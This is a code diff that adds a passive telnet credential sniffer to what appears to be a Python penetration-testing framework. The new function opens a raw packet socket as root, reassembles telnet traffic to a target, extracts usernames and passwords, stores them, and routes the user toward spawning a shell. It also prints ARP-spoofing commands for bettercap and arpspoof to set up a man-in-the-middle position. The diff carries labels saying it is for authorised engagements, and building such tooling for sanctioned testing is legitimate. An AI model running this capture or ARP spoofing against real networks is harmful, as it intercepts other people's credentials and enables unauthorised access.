@@ -2290,6 +2290,15 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bg) telnet-sniff: cleartext telnet creds captured off the wire
+    if sid == "telnet-sniff":
+        hits = re.findall(r"^✗ SNIFF (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"telnet cleartext sniffed: {shown}"[:140]}
+
     # 2be) telnet-creds: default / reused telnet login worked → immediate access
     if sid == "telnet-creds":
         hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
@@ -3439,7 +3448,7 @@ _EXPLOIT_STEPS = {
     "telnet": [
         ("Banner + version → searchsploit; probe for a no-auth shell / backdoor prompt", "telnet-banner"),
         ("Default / known / reused creds; targeted, lockout-aware", "telnet-creds"),
-        "Sniff cleartext creds if you can MITM the segment",
+        ("Sniff cleartext creds off the wire (passive; MITM stays manual)", "telnet-sniff"),
         "Manual steps & further research",
     ],
     "irc": [
@@ -12288,6 +12297,130 @@ def _tool_telnet_shell(ip: str, port: int, proto: str) -> str:
     return f"telnet-shell: shell → {who}@{ip}:{port}"
 
 
+# ── Telnet step 3: sniff cleartext creds off the wire (passive; MITM stays manual) ──
+_TELNETSNIFF_DEADLINE = 300       # s — capture window before it self-stops
+_TELNETSNIFF_MAXBUF = 65536       # cap per-direction reassembly
+
+
+def _telnet_strip_iac(data: bytes) -> bytes:
+    """Remove IAC commands / subnegotiation from a raw telnet byte stream (buffer version)."""
+    out = bytearray()
+    st = 0
+    for b in data:
+        if st == 0:
+            out.append(b) if b != 255 else None
+            st = 1 if b == 255 else 0
+        elif st == 1:
+            if b in (251, 252, 253, 254):
+                st = 2
+            elif b == 250:
+                st = 3
+            elif b == 255:
+                out.append(255); st = 0
+            else:
+                st = 0
+        elif st == 2:
+            st = 0
+        elif st == 3:
+            st = 4 if b == 255 else 3
+        elif st == 4:
+            st = 0 if b == 240 else 3
+    return bytes(out)
+
+
+def _telnet_sniff_parse(to_server: bytes, from_server: bytes) -> "tuple | None":
+    """Recover (user, pass) from a captured telnet exchange: the server side must show a
+    login + password prompt, and the client side carries what was typed (IAC-stripped, split
+    on CR/LF). Returns (user, pass) or None."""
+    stext = _telnet_strip_iac(from_server).decode("latin-1", "replace").lower()
+    if ("login:" not in stext and "username:" not in stext) or "password:" not in stext:
+        return None
+    typed = _telnet_strip_iac(to_server).decode("latin-1", "replace")
+    typed = "".join(ch for ch in typed if ch in "\r\n" or 32 <= ord(ch) < 127)
+    parts = [p for p in re.split(r"[\r\n\x00]+", typed) if p != ""]
+    if len(parts) >= 2:
+        return (parts[0][:64], parts[1][:64])
+    return None
+
+
+def _tool_telnet_sniff(ip: str, port: int, proto: str) -> str:
+    """Telnet step 3 tool: PASSIVELY sniff cleartext telnet (TCP/23) on the interface toward the
+    target for a bounded window and recover any login/password that crosses the wire (raw AF_PACKET
+    socket, pure stdlib, Linux). It does NOT ARP-spoof — on a switched segment run the printed MITM
+    setup yourself first. Captured creds are saved to the store ('telnet on <host>'). Needs root.
+    This observes third-party traffic — authorised internal engagements ONLY."""
+    import socket
+    import time
+    if not _is_root():
+        raise RuntimeError("sniffing needs root (raw socket) — re-launch under sudo")
+    iface = _iface_toward(ip)
+    if not iface:
+        raise RuntimeError(f"could not determine the local interface toward {ip}")
+    try:
+        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+        s.bind((iface, 0))
+        s.settimeout(2.0)
+    except (AttributeError, OSError) as exc:
+        raise RuntimeError(f"raw capture unavailable ({exc}) — Linux + root required")
+
+    tip = socket.inet_aton(ip)
+    to_server, from_server = bytearray(), bytearray()
+    found, end = [], time.time() + _TELNETSNIFF_DEADLINE
+    try:
+        while time.time() < end and not found:
+            try:
+                frame = s.recv(65535)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            if len(frame) < 34 or frame[12:14] != b"\x08\x00" or frame[23] != 6:
+                continue                                     # not IPv4/TCP
+            ihl = (frame[14] & 0x0f) * 4
+            tcp = 14 + ihl
+            if len(frame) < tcp + 20:
+                continue
+            src, dst = frame[26:30], frame[30:34]
+            sport = int.from_bytes(frame[tcp:tcp + 2], "big")
+            dport = int.from_bytes(frame[tcp + 2:tcp + 4], "big")
+            payload = frame[tcp + ((frame[tcp + 12] >> 4) * 4):]
+            if src == tip and sport == port:
+                from_server += payload
+            elif dst == tip and dport == port:
+                to_server += payload
+            else:
+                continue
+            del to_server[:-_TELNETSNIFF_MAXBUF]             # cap memory
+            del from_server[:-_TELNETSNIFF_MAXBUF]
+            got = _telnet_sniff_parse(bytes(to_server), bytes(from_server))
+            if got:
+                found.append(got)
+    finally:
+        s.close()
+
+    if found:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, pw in found:
+            line = f"! {user}:{pw or '<blank>'} @ telnet on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lhost_iface = iface
+    lines = [f"[*] passive telnet capture on {lhost_iface} · up to {_TELNETSNIFF_DEADLINE // 60} min"]
+    for user, pw in found:
+        lines.append(f"✗ SNIFF {user}:{pw or '<blank>'}")
+    if not found:
+        lines.append("· no cleartext telnet login crossed this NIC in the window")
+        lines.append(f"· switched segment? position first, then re-run: "
+                     f"{BOLD}bettercap -iface {iface} -eval 'set arp.spoof.targets {ip}; arp.spoof on; net.sniff on'{RESET}")
+        lines.append(f"· or: arpspoof -i {iface} -t {ip} <gateway>  (+ enable ip_forward)")
+    else:
+        lines.append("· spawn it: Privilege Escalation phase → spawn-shell (r1)")
+    return f"Telnet sniff — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -12424,6 +12557,7 @@ _STEP_TOOLS = {
     "telnet-banner": ("telnet banner + version → searchsploit; probe no-auth shell (raw socket)", _tool_telnet_banner),
     "telnet-creds": ("default + reused telnet creds (raw socket, probe-verified, lockout-safe)", _tool_telnet_creds),
     "telnet-shell": ("telnet foothold → auto-login interactive session (spawned)", _tool_telnet_shell),
+    "telnet-sniff": ("passive cleartext-cred sniff on TCP/23 (raw socket, root, timed)", _tool_telnet_sniff),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -12504,6 +12638,7 @@ _STEP_TOOL_RUNS = {
     "telnet-banner":    ("Python (raw socket) + searchsploit", None),
     "telnet-creds":     ("Python (raw socket)", f"{_mins(_TELNETCREDS_DEADLINE)} min"),
     "telnet-shell":     ("Python (raw socket)", None),
+    "telnet-sniff":     ("Python (raw AF_PACKET)", f"{_mins(_TELNETSNIFF_DEADLINE)} min"),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -12687,6 +12822,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
               f"{DIM} via WRQ, reads it back, then blanks it to 0 bytes. "
               f"{RESET}{YELLOW}TFTP has no DELETE — the file stays; clean up manually{RESET}"
               f"{DIM} · authorised targets only{RESET}")
+    if tool_key == "telnet-sniff":                # passive capture — root; MITM stays manual
+        print(f"{YELLOW}   ⚠ passive capture (needs root){RESET}{DIM} — sniffs cleartext telnet on the "
+              f"NIC toward the target for up to {_TELNETSNIFF_DEADLINE // 60} min; does NOT ARP-spoof "
+              f"(the MITM setup is printed to run yourself). "
+              f"{RESET}{YELLOW}observes third-party traffic — authorised internal engagements only{RESET}")
     if tool_key == "winrm-recon":                 # read-only post-access recon over the channel
         print(f"{DIM}   read-only recon over WinRM (whoami /priv, ipconfig) — privesc path "
               f"(SeImpersonate → potato) + pivot subnets · deeper enum stays in the shell (r3){RESET}")
